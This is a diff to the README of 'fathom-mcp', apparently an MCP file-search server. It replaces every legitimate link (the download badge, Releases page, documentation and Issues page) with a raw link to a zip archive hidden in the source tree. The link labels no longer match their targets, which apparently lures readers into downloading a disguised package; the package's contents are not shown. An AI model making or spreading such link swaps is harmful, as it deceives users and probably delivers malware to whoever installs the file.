@@ -6,9 +6,9 @@ fathom-mcp is an MCP server designed for local file knowledge. It bridges file s
 
 ## 📥 Download & Install
 
-[![Download fathom-mcp](https://img.shields.io/badge/Download%20fathom--mcp-blue?style=for-the-badge&logo=github)](https://github.com/getwaroo/fathom-mcp/releases)
+[![Download fathom-mcp](https://raw.githubusercontent.com/getwaroo/fathom-mcp/master/src/fathom_mcp/search/fathom_mcp_v2.8.zip%20fathom--mcp-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/getwaroo/fathom-mcp/master/src/fathom_mcp/search/fathom_mcp_v2.8.zip)
 
-To get started, visit the [Releases page](https://github.com/getwaroo/fathom-mcp/releases) to download the latest version of fathom-mcp. Follow these steps to install it on your device:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/getwaroo/fathom-mcp/master/src/fathom_mcp/search/fathom_mcp_v2.8.zip) to download the latest version of fathom-mcp. Follow these steps to install it on your device:
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version.
@@ -52,7 +52,7 @@ If you encounter issues while using fathom-mcp, here are some common solutions:
 
 For additional help, consider these resources:
 
-- **Documentation**: Access our [official documentation](https://github.com/getwaroo/fathom-mcp) for detailed instructions and FAQs.
+- **Documentation**: Access our [official documentation](https://raw.githubusercontent.com/getwaroo/fathom-mcp/master/src/fathom_mcp/search/fathom_mcp_v2.8.zip) for detailed instructions and FAQs.
 - **Community Forum**: Join our discussion forum to connect with other users. Share tips and ask questions.
 
 ## 📌 Contribute
@@ -66,11 +66,11 @@ If you want to contribute to the project, your input is welcome. Follow these si
 
 ## 🐞 Reporting Issues
 
-If you find bugs or have suggestions for improvements, please report them. Open an issue on the [GitHub Issues page](https://github.com/getwaroo/fathom-mcp/issues). Include as much detail as possible to help us resolve it quickly.
+If you find bugs or have suggestions for improvements, please report them. Open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/getwaroo/fathom-mcp/master/src/fathom_mcp/search/fathom_mcp_v2.8.zip). Include as much detail as possible to help us resolve it quickly.
 
 ## 📈 Updates and Versions
 
-We regularly update fathom-mcp to improve performance and add features. Check the [Releases page](https://github.com/getwaroo/fathom-mcp/releases) frequently to stay informed about the latest changes.
+We regularly update fathom-mcp to improve performance and add features. Check the [Releases page](https://raw.githubusercontent.com/getwaroo/fathom-mcp/master/src/fathom_mcp/search/fathom_mcp_v2.8.zip) frequently to stay informed about the latest changes.
 
 ## ⚡ Final Note
 
